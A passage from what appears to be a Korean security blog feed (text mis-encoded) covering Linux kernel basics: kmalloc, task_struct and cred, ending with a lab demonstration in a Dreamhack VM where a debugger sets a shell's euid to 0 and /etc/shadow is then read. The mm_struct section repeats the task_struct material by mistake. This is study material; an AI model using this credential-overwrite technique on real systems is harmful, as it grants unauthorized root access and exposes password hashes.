class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">&lt;rt_mutex_setprio&gt;:<br>    e1a0c00d movip, sp<br>    e92ddff0 push&#123;r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc&#125;<br>    e24cb004 subfp, ip, #4<br>    e24dd014 subsp, sp, #20<br>    .<br>    .<br>    .<br></code></pre></td></tr></table></figure><p>í•´ë‹¹ í•¨ìˆ˜ì˜ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ í™•ì¸í•˜ë©´ ë ˆì§€ìŠ¤í„° {r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}ë¥¼ ìŠ¤íƒ ê³µê°„ì— pushí•˜ë©° sub sp, sp, #20ì„ í†µí•´ ìŠ¤íƒì˜ 20ë°”ì´íŠ¸ì˜ ê³µê°„ ë§Œí¼ì„ í™•ë³´í•œë‹¤. ì´ ë•Œ ì‚¬ìš©ë˜ëŠ” ì§€ì—­ë³€ìˆ˜ì˜ ê°œìˆ˜ëŠ” 8ê°œì´ë©° 32ë°”ì´íŠ¸ ë§Œí¼ì˜ ê³µê°„ì„ í™•ë³´í•´ì•¼ í•œë‹¤ê³  ì˜ë¬¸ì´ ë“œë‚˜ ì´ëŠ” ë‚´ë¶€ì ìœ¼ë¡œ ë ˆì§€ìŠ¤í„°ë¥¼ í™œìš©í•˜ëŠ” ë°©ì•ˆìœ¼ë¡œ ì§„í–‰ë˜ì§€ ì•Šì•˜ì„ê¹Œë¼ê³  ì¡°ì‹¬ìŠ¤ëŸ½ê²Œ íŒë‹¨í•œë‹¤. ìì„¸í•œ ë¶€ë¶„ì€ b30w0lfë‹˜ê»˜ ì—¬ì­¤ë´ì•¼ í•  ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.</p><h2 id="ë™ì -ë©”ëª¨ë¦¬"><a href="#ë™ì -ë©”ëª¨ë¦¬" class="headerlink" title="ë™ì  ë©”ëª¨ë¦¬"></a>ë™ì  ë©”ëª¨ë¦¬</h2><p>ì»¤ë„ì—ì„œì˜ ë™ì  ë©”ëª¨ë¦¬ í• ë‹¹ì— ëŒ€í•˜ì—¬ êµ¬ì²´ì ìœ¼ë¡œ ì•Œì•„ë³´ë ¤ê³  í•œë‹¤. ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ì€ kmalloc() í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ ë™ì  ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">static ssize_t regmap_read_debugfs(struct regmap *map, unsigned int from,<br>   unsigned int to, char __user *user_buf, size_t count, loff_t *ppos)<br>    &#123;<br>    ...<br>    if (*ppos &lt; 0 || !count)<br>    return -EINVAL;<br><br>    buf = kmalloc(count, GFP_KERNEL);<br>    if (!buf)<br>    return -ENOMEM;<br></code></pre></td></tr></table></figure><p>ìƒë‹¨ì˜ ì½”ë“œë¥¼ í™•ì¸í•˜ë©´ kmalloc() í•¨ìˆ˜ë¥¼ ë³¼ ìˆ˜ ìˆìœ¼ë©° í•´ë‹¹ í•¨ìˆ˜ëŠ” ë‘ ê°œì˜ ì¸ì countì™€ GFP_KERNELì´ ì „ë‹¬ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì¢…í•©í•´ ì½”ë“œë¥¼ í•´ì„í•˜ë©´ GFP_KERNEL ì˜µì…˜ì„ í†µí•´ count ë°”ì´íŠ¸ ë§Œí¼ ë™ì  ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•œë‹¤ë¼ëŠ” ì˜ë¯¸ì´ë‹¤. kmallocì„ ì´ìš©í•˜ë©´ ì»¤ë„ ë‚´ë¶€ ë©”ëª¨ë¦¬ ì‹œìŠ¤í…œì˜ ê²½ìš° ì»¤ë„ ë‚´ë¶€ì— í• ë‹¹í•  ë™ì  ë©”ëª¨ë¦¬ê°€ ìˆìœ¼ë©´ ìµœëŒ€í•œ í• ë‹¹í•´ì¤€ë‹¤ê³  í•œë‹¤.</p><h2 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h2><p>ì •ì  ë©”ëª¨ë¦¬ì˜ í• ë‹¹ì€ ìœ ì € ê³µê°„(user space)ì—ì„œì˜ ìŠ¤íƒ ê³µê°„í• ë‹¹ì€ ì»¤ë„ ë©”ëª¨ë¦¬ ê³µê°„ì— í• ë‹¹ëœë‹¤. ì´ì™¸ì—ëŠ” í¬ê²Œ ë‹¤ë¥¸ ì ì´ ì—†ì–´ë³´ì´ë©° ë™ì  ë©”ëª¨ë¦¬ í• ë‹¹ì€ kmalloc() í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•œë‹¤ì´ë‹¤. ë‹¨ ì˜ì•„í•œ ë¶€ë¶„ì´ ì»¤ë„ ë‚´ë¶€ì— í• ë‹¹í•  ë™ì  ë©”ëª¨ë¦¬ê°€ ìˆìœ¼ë©´ ìµœëŒ€í•œ í• ë‹¹í•´ì¤€ë‹¤ê³  í•˜ëŠ” ì˜ë¯¸ì¸ë‹¤. ì´ëŠ” ìŠ¬ë©(slab)ì— ëŒ€í•œ ê°œë…ì„ ìµí˜€ì•¼ ë”ìš± ê¹Šê²Œ ì´í•´ê°€ ê°€ëŠ¥í•  ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.</p><h2 id="ì°¸ê³ ìë£Œ"><a href="#ì°¸ê³ ìë£Œ" class="headerlink" title="ì°¸ê³ ìë£Œ"></a>ì°¸ê³ ìë£Œ</h2><p><a href="http://rousalome.egloos.com/10002615">http://rousalome.egloos.com/10002615</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (2) íƒœìŠ¤í¬(task)</title>
    <link href="/2021/09/05/LinuxKernelBasic2/"/>
    <url>/2021/09/05/LinuxKernelBasic2/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-2-íƒœìŠ¤í¬-task"><a href="#Research-Linux-Kernel-Basic-2-íƒœìŠ¤í¬-task" class="headerlink" title="[Research] Linux Kernel Basic - (2) íƒœìŠ¤í¬(task)"></a>[Research] Linux Kernel Basic - (2) íƒœìŠ¤í¬(task)</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>ì§€ë‚œ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ê³µê²©(Linux Kernel Exploitation)ì„ ì§„í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì— ëŒ€í•´ ê°„ëµíˆ ì–¸ê¸‰í•˜ì˜€ë‹¤. í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ìš´ì˜ì²´ì œ(Operating System)ì—ì„œ ë‹¤ë¤„ì§€ëŠ” í”„ë¡œì„¸ìŠ¤(prcoess)ì™€ ìŠ¤ë ˆë“œ(thread)ë¥¼ ì •ì˜í•˜ëŠ” êµ¬ì¡°ì¸ íƒœìŠ¤í¬(task)ë¥¼ ì»¤ë„ ì†ŒìŠ¤ì½”ë“œ ë¶„ì„ì„ í†µí•´ ì‹¬ë„ìˆê²Œ ì´í•´í•˜ê³  í•´ë‹¹ ê³¼ì •ì„ í†µí•´ ì–´ë– í•œ ë°©ì‹ìœ¼ë¡œ ê¶Œí•œí™•ëŒ€(Local Privilege Escalation)ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆëŠ” ê°€ì— ê´€í•œ ì¸ì‚¬ì´íŠ¸ë¥¼ ì–»ê¸° ìœ„í•œ ì—°êµ¬ë¥¼ ì§„í–‰í•˜ì˜€ë‹¤.</p><h2 id="í”„ë¡œì„¸ìŠ¤-proces-ë°-ìŠ¤ë ˆë“œ-thread"><a href="#í”„ë¡œì„¸ìŠ¤-proces-ë°-ìŠ¤ë ˆë“œ-thread" class="headerlink" title="í”„ë¡œì„¸ìŠ¤(proces) ë° ìŠ¤ë ˆë“œ(thread)"></a>í”„ë¡œì„¸ìŠ¤(proces) ë° ìŠ¤ë ˆë“œ(thread)</h2><pre><code>$ ps -efUID         PID   PPID  C STIME TTY          TIME CMDroot          1      0  0 01:50 ?        00:00:02 /sbin/init auto nopromptroot          2      0  0 01:50 ?        00:00:00 [kthreadd]root          3      2  0 01:50 ?        00:00:00 [rcu_gp]root          4      2  0 01:50 ?        00:00:00 [rcu_par_gp]root          6      2  0 01:50 ?        00:00:00 [kworker/0:0H-kb]root          9      2  0 01:50 ?        00:00:00 [mm_percpu_wq]root         10      2  0 01:50 ?        00:00:00 [ksoftirqd/0]root         11      2  0 01:50 ?        00:00:00 [rcu_sched]root         12      2  0 01:50 ?        00:00:00 [migration/0]root         13      2  0 01:50 ?        00:00:00 [idle_inject/0]</code></pre><p>ë¦¬ëˆ…ìŠ¤ë¥¼ ì‚¬ìš©í•˜ë‹¤ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì€ ëª…ë ¹ì–´ë¥¼ í†µí•´ í”„ë¡œì„¸ìŠ¤ì˜ ì •ë³´ë¥¼ í™•ì¸í•´ì•¼í•˜ëŠ” ê²½ìš°ê°€ ë°œìƒí•œë‹¤. í”„ë¡œì„¸ìŠ¤ì˜ ì •ë³´ë¥¼ í™•ì¸í•˜ë©´ ì–´ë– í•œ í”„ë¡œì„¸ìŠ¤ì¸ì§€, í”„ë¡œì„¸ìŠ¤ì˜ ë²ˆí˜¸ëŠ” ëª‡ë²ˆì¸ì§€, ì–´ë– í•œ ê¶Œí•œìœ¼ë¡œ ë™ì‘ì„ ì§„í–‰í•˜ëŠ”ì§€ì— ê´€í•œ ì •ë³´ë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ë¦¬ëˆ…ìŠ¤ì—ì„œëŠ” í”„ë¡œì„¸ìŠ¤ì— ì¢…ì†ë˜ì–´ ìƒˆë¡œìš´ ì‹¤í–‰ì˜ íë¦„ì„ ìƒì„±í•˜ëŠ” ìŠ¤ë ˆë“œ(thread)ì˜ ê²½ìš°ì—ë„ í•˜ë‚˜ì˜ í”„ë¡œê·¸ë¨ì˜ ì‹¤í–‰ë‹¨ìœ„ë¡œ ë³¼ ìˆ˜ ìˆìœ¼ë©° ì´ëŸ¬í•œ ë‹¨ìœ„ë¥¼ íƒœìŠ¤í¬(task)ë¼ê³  í•œë‹¤.</p><h2 id="íƒœìŠ¤í¬-task"><a href="#íƒœìŠ¤í¬-task" class="headerlink" title="íƒœìŠ¤í¬(task)"></a>íƒœìŠ¤í¬(task)</h2><p>ë¦¬ëˆ…ìŠ¤ ìš´ì˜ì²´ì œì˜ ê²½ìš° ì»´í“¨í„°ê°€ í•´ì•¼í•  ì‘ì—…ì˜ ë‹¨ìœ„ì¸ ì—¬ëŸ¬ ê°œì˜ íƒœìŠ¤í¬(task)ë¥¼ ìƒì„±í•˜ë©° ë‹¤ìˆ˜ì˜ íƒœìŠ¤í¬ë¥¼ ê´€ë¦¬(multitasking)í•˜ë©° ì´ëŸ¬í•œ íƒœìŠ¤í¬ì˜ ì‹¤í–‰ ì‹œê°„ì„ ë°°ë¶„í•˜ëŠ” ë°©ì‹(scheduling)ì„ í†µí•´ ì‚¬ìš©ìê°€ ë‹¤ìˆ˜ì˜ í”„ë¡œê·¸ë¨ì„ ì •ìƒì ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í•œë‹¤. íƒœìŠ¤í¬ë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•´ì„œëŠ” ì—¬ëŸ¬ê°€ì§€ ì •ë³´ê°€ í•„ìš”í•˜ë‹¤. ì´ëŠ” ì•ì„œ ì œì‹œí•˜ì˜€ë˜ ëª…ë ¹ì–´ì˜ ê²°ê³¼ë¡œ ì¼ë¶€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ì •ë³´ëŠ” task_struct êµ¬ì¡°ì²´ì— ì •ì˜ë˜ì–´ ìˆìœ¼ë©° í•´ë‹¹ êµ¬ì¡°ì²´ëŠ” &lt;include/linux/sched.h&gt;ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><h3 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">struct task_struct &#123;<br>    ...<br>unsigned int__state;<br>struct list_headtasks;<br>    struct mm_struct*mm;<br>pid_tpid;<br>pid_ttgid;<br>struct task_struct __rcu*real_parent;<br>struct task_struct __rcu*parent;<br>const struct cred __rcu*cred;<br>charcomm[TASK_COMM_LEN];<br>struct files_struct*files;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>ì†ì„±(property)</th><th>ì„¤ëª…(description)</th></tr></thead><tbody><tr><td>__state</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì‹¤í–‰ìƒíƒœë¥¼ ë‚˜íƒ€ë‚¸ë‹¤. 0ì€ ì‹¤í–‰ ì¤‘ì´ê±°ë‚˜ ì‹¤í–‰ ê°€ëŠ¥í•œ(ready) ìƒíƒœë¥¼ í‘œí˜„í•œë‹¤. 0ë³´ë‹¤ í° ê°’ì˜ ê²½ìš°ëŠ” ì •ì§€ ë˜ëŠ” ëŒ€ê¸° ìƒíƒœë¥¼ í‘œí˜„í•œë‹¤.</td></tr><tr><td>tasks</td><td>íƒœìŠ¤í¬ì˜ ì—°ê²° ë…¸ë“œë¥¼ ì˜ë¯¸í•œë‹¤.</td></tr><tr><td>mm</td><td>mm_structëŠ” ìœ ì €ì˜ ë©”ëª¨ë¦¬ ì˜ì—­(ì£¼ì†Œê³µê°„)ì— ê´€í•œ ì •ë³´ë¥¼ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì¡°ì²´ì´ë‹¤. í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì£¼ì†Œê³µê°„ì˜ ì •ë³´ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>pid</td><td>í”„ë¡œì„¸ìŠ¤ì˜ ì‹ë³„ê°’ì„ ì˜ë¯¸í•œë‹¤.</td></tr><tr><td>tgid</td><td>ìŠ¤ë ˆë“œ ê·¸ë£¹ì˜ ì‹ë³„ê°’ì„ ì˜ë¯¸í•œë‹¤.</td></tr><tr><td>real_parent</td><td>í•´ë‹¹ íƒœìŠ¤í¬ë¥¼ ìƒì„±í•œ ë¶€ëª¨ íƒœìŠ¤í¬ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>parent</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì˜ í˜„ì¬ ë¶€ëª¨ íƒœìŠ¤í¬ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>cred</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì‹ ì› ì •ë³´ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>comm[TASK_COMM_LEN]</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì´ë¦„ì„ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>files</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì—ì„œ ì—´ë¦° íŒŒì¼ ë””ìŠ¤í¬ë¦½í„° ì •ë³´ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr></tbody></table><h3 id="mm-struct"><a href="#mm-struct" class="headerlink" title="mm_struct"></a>mm_struct</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">struct task_struct &#123;<br>    ...<br>unsigned int__state;<br>struct list_headtasks;<br>    struct mm_struct*mm;<br>pid_tpid;<br>pid_ttgid;<br>struct task_struct __rcu*real_parent;<br>struct task_struct __rcu*parent;<br>const struct cred __rcu*cred;<br>charcomm[TASK_COMM_LEN];<br>struct files_struct*files;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>ì†ì„±(property)</th><th>ì„¤ëª…(description)</th></tr></thead><tbody><tr><td>__state</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì‹¤í–‰ìƒíƒœë¥¼ ë‚˜íƒ€ë‚¸ë‹¤. 0ì€ ì‹¤í–‰ ì¤‘ì´ê±°ë‚˜ ì‹¤í–‰ ê°€ëŠ¥í•œ(ready) ìƒíƒœë¥¼ í‘œí˜„í•œë‹¤. 0ë³´ë‹¤ í° ê°’ì˜ ê²½ìš°ëŠ” ì •ì§€ ë˜ëŠ” ëŒ€ê¸° ìƒíƒœë¥¼ í‘œí˜„í•œë‹¤.</td></tr><tr><td>tasks</td><td>íƒœìŠ¤í¬ì˜ ì—°ê²° ë…¸ë“œë¥¼ ì˜ë¯¸í•œë‹¤.</td></tr><tr><td>mm</td><td>mm_structëŠ” ìœ ì €ì˜ ë©”ëª¨ë¦¬ ì˜ì—­(ì£¼ì†Œê³µê°„)ì— ê´€í•œ ì •ë³´ë¥¼ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì¡°ì²´ì´ë‹¤. í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì£¼ì†Œê³µê°„ì˜ ì •ë³´ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>pid</td><td>í”„ë¡œì„¸ìŠ¤ì˜ ì‹ë³„ê°’ì„ ì˜ë¯¸í•œë‹¤.</td></tr><tr><td>tgid</td><td>ìŠ¤ë ˆë“œ ê·¸ë£¹ì˜ ì‹ë³„ê°’ì„ ì˜ë¯¸í•œë‹¤.</td></tr><tr><td>real_parent</td><td>í•´ë‹¹ íƒœìŠ¤í¬ë¥¼ ìƒì„±í•œ ë¶€ëª¨ íƒœìŠ¤í¬ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>parent</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì˜ í˜„ì¬ ë¶€ëª¨ íƒœìŠ¤í¬ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>cred</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì‹ ì› ì •ë³´ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>comm[TASK_COMM_LEN]</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì´ë¦„ì„ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>files</td><td>í•´ë‹¹ íƒœìŠ¤í¬ì—ì„œ ì—´ë¦° íŒŒì¼ ë””ìŠ¤í¬ë¦½í„° ì •ë³´ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr></tbody></table><h3 id="cred"><a href="#cred" class="headerlink" title="cred"></a>cred</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">struct cred &#123;<br>atomic_tusage;<br>    ...<br>kuid_tuid;/* real UID of the task */<br>kgid_tgid;/* real GID of the task */<br>kuid_tsuid;/* saved UID of the task */<br>kgid_tsgid;/* saved GID of the task */<br>kuid_teuid;/* effective UID of the task */<br>kgid_tegid;/* effective GID of the task */<br>kuid_tfsuid;/* UID for VFS ops */<br>kgid_tfsgid;/* GID for VFS ops */<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>ì†ì„±(property)</th><th>ì„¤ëª…(description)</th></tr></thead><tbody><tr><td>usage</td><td>ëª‡ ê°œì˜ í”„ë¡œì„¸ìŠ¤ê°€ í•´ë‹¹ cred êµ¬ì¡°ì²´ë¥¼ ì°¸ì¡°í•˜ê³  ìˆëŠ” ì§€ ë‚˜íƒ€ë‚¸ ì •ë³´ì´ë‹¤.</td></tr><tr><td>uid</td><td>í”„ë¡œì„¸ìŠ¤ë¥¼ ì†Œìœ í•˜ê³  ìˆëŠ” ì‚¬ìš©ìì˜ IDë¥¼ ë‚˜íƒ€ë‚¸ ì •ë³´ì´ë‹¤. 0ì¼ ê²½ìš° ìµœê³ ê´€ë¦¬ì ê¶Œí•œì„ ì˜ë¯¸í•œë‹¤.</td></tr><tr><td>euid</td><td>í”„ë¡œì„¸ìŠ¤ì˜ ì‹¤íš¨ì ì¸ ì‚¬ìš©ì IDë¥¼ ë‚˜íƒ€ë‚¸ ì •ë³´ì´ë‹¤. ê¶Œí•œ ê²€ì‚¬ë¥¼ í•  ê²½ìš° ì‹¤ì œ ì‚¬ìš©ë˜ëŠ” ê°’ì„ ì €ì¥í•œë‹¤. ì¼ë°˜ì ìœ¼ë¡œ uidì™€ ê°™ì€ ê°’ì„ ê°€ì§„ë‹¤.</td></tr><tr><td>gid</td><td>í”„ë¡œì„¸ìŠ¤ë¥¼ ì†Œìœ í•˜ ê³  ìˆëŠ” ê·¸ë£¹ì˜ ID ì •ë³´ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr><tr><td>egid</td><td>í”„ë¡œì„¸ìŠ¤ì˜ ì‹¤íš¨ì ì¸ ê·¸ë£¹ì˜ ID ì •ë³´ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.</td></tr></tbody></table><h2 id="credential-ì •ë³´-ìˆ˜ì •ì„-í†µí•œ-ê¶Œí•œ-ìƒìŠ¹"><a href="#credential-ì •ë³´-ìˆ˜ì •ì„-í†µí•œ-ê¶Œí•œ-ìƒìŠ¹" class="headerlink" title="credential ì •ë³´ ìˆ˜ì •ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹"></a>credential ì •ë³´ ìˆ˜ì •ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹</h2><p>ì•ì„œ ì§„í–‰í•œ ê³¼ì •ì„ í†µí•´ í”„ë¡œì„¸ìŠ¤ì™€ ìŠ¤ë ˆë“œëŠ” íƒœìŠ¤í¬ë¼ëŠ” ë‹¨ìœ„ë¡œ ê´€ë¦¬ë˜ì–´ ìˆê³  íƒœìŠ¤í¬ì˜ ì •ë³´ ì†ì„±ì„ ê´€ë¦¬í•˜ëŠ” ì£¼ì²´ê°€ ìˆìœ¼ë©° ì‹ ì›ì •ë³´ëŠ” credë¼ëŠ” êµ¬ì¡°ì²´ì—ì„œ ê´€ë¦¬ë˜ê³  ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤. ê·¸ë ‡ë‹¤ë©´ íƒœìŠ¤í¬ì˜ ì‹ ì›ì •ë³´ë¥¼ ë³€ê²½í•˜ì˜€ì„ ê²½ìš° ê¶Œí•œ ìƒìŠ¹(Local Privilege Escalation)ì´ ì´ë¤„ì§ˆ ìˆ˜ ìˆëŠ” ì§€ í™•ì¸í•˜ê² ë‹¤. </p><p>í•´ë‹¹ ì‹¤ìŠµì€ Dreamhackì—ì„œ ì œì‹œí•˜ëŠ” ì‹¤ìŠµ íŒŒì¼ì„ ì´ìš©í•˜ì—¬ ì§„í–‰í•˜ì˜€ìŒì„ ë°íŒë‹¤.</p><pre><code>dreamhack@dh-lke:~$ whoamidreamhackdreamhack@dh-lke:~$ cat /etc/shadowcat: /etc/shadow: Permission denieddreamhack@dh-lke:~$ echo $$295dreamhack@dh-lke:~$ ...</code></pre><p>qemuë¥¼ ì´ìš©í•˜ì—¬ í„°ë¯¸ë„ì„ ì‹¤í–‰í•˜ì˜€ì„ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì´ root ê¶Œí•œì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— /etc/shadow íŒŒì¼ì„ ë³¼ ìˆ˜ ì—†ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©° í•´ë‹¹ ì‰˜ì˜ í”„ë¡œì„¸ìŠ¤ ì•„ì´ë””(PID)ëŠ” 295ë¡œ í™•ì¸ëœë‹¤.</p><pre><code>pwndbg&gt; x/bs $lx_task_by_pid(295).comm0xffff88803e348a98:    &quot;bash&quot;pwndbg&gt; print $lx_task_by_pid(295).state$1 = 1pwndbg&gt; print $lx_task_by_pid(295).cred-&gt;uid$2 = &#123;    val = 1000&#125;pwndbg&gt; set $lx_task_by_pid(295).cred-&gt;euid = 0pwndbg&gt; cont</code></pre><p>í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ì˜ ì•„ì´ë””ë¥¼ ì´ìš©í•˜ì—¬ í•´ë‹¹ íƒœìŠ¤í¬ì˜ ì •ë³´ë¥¼ í™•ì¸í•´ë³¸ ê²°ê³¼ í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ëŠ” ì‹¤í–‰ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ì´ë©° uidê°€ 1000ìœ¼ë¡œ ì§€ì •ë˜ì–´ ìˆë‹¤. ì´ë¥¼ ì˜ë„ì ìœ¼ë¡œ 0ìœ¼ë¡œ ìˆ˜ì •í•´ë³´ì•˜ë‹¤.</p><pre><code>dreamhack@dh-lke:~$ whoamirootdreamhack@dh-lke:~$ cat /etc/shadowroot:*:18511:0:99999:7:::daemon:*:18511:0:99999:7:::bin:*:18511:0:99999:7:::sys:*:18511:0:99999:7:::sync:*:18511:0:99999:7:::games:*:18511:0:99999:7:::man:*:18511:0:99999:7:::lp:*:18511:0:99999:7:::mail:*:18511:0:99999:7:::</code></pre><p>í•´ë‹¹ ê³¼ì •ì„ ìˆ˜í–‰í•´ë³¸ ê²°ê³¼ í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ëŠ” ìµœê³  ê´€ë¦¬ì ê¶Œí•œ(root)ë¥¼ íšë“í•˜ì˜€ìŒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p><h2 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h2><p>í”„ë¡œì„¸ìŠ¤(process)ì™€ ìŠ¤ë ˆë“œ(thread)ëŠ” íƒœìŠ¤í¬ ê´€ë¦¬ë¡œ ìš´ì˜ë˜ë©° íƒœìŠ¤í¬ì˜ ì†ì„±ì„ í‘œí˜„í•˜ëŠ” ì •ë³´ê°€ ìˆë‹¤. í•´ë‹¹ ì •ë³´ ì¤‘ì—ëŠ” í”„ë¡œì„¸ìŠ¤ì˜ ì‹ ì›ì •ë³´ë¥¼ ì˜ë¯¸í•˜ëŠ” cred êµ¬ì¡°ì²´ í˜•íƒœì˜ ì •ë³´ê°€ ìˆìœ¼ë©° ì´ë¥¼ ì¡°ì‘í•˜ì—¬ ìµœê³ ê´€ë¦¬ì ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆë‹¤. íƒœìŠ¤í¬ì˜ ì •ë³´ëŠ” ì»¤ë„ ë©”ëª¨ë¦¬ì˜ ìƒì£¼í•˜ë©° ì»¤ë„ì˜ ì·¨ì•½ì ì„ ì´ìš©í•œë‹¤ë©´ ê¶Œí•œìƒìŠ¹(Local Privilege Escalation)ì´ ë°œìƒí•  ìˆ˜ ìˆìŒì„ ë³´ì¸ë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (1) ìœ ì €ëª¨ë“œì™€ ì»¤ë„ëª¨ë“œ</title>
    <link href="/2021/09/04/LinuxKernelBasic1/"/>
    <url>/2021/09/04/LinuxKernelBasic1/</url>
    
